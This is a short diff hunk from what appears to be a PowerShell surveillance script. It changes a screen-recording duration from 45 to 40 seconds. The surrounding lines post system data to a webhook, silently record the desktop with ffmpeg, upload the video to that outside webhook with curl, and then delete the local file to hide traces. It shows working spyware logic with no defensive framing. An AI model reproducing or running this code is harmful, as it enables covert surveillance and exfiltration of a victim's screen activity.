@@ -921,8 +921,8 @@ param ([int[]]$t)
     Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
     
     $mkvPath = "$env:Temp\ScreenClip.mkv"
-    if ($t.Length -eq 0){$t = 45}
-    .$env:Temp\ffmpeg.exe -f gdigrab -t 45 -framerate 30 -i desktop $mkvPath
+    if ($t.Length -eq 0){$t = 40}
+    .$env:Temp\ffmpeg.exe -f gdigrab -t 40 -framerate 30 -i desktop $mkvPath
     curl.exe -F file1=@"$mkvPath" $hookurl | Out-Null
     sleep 5
     rm -Path $mkvPath -Force
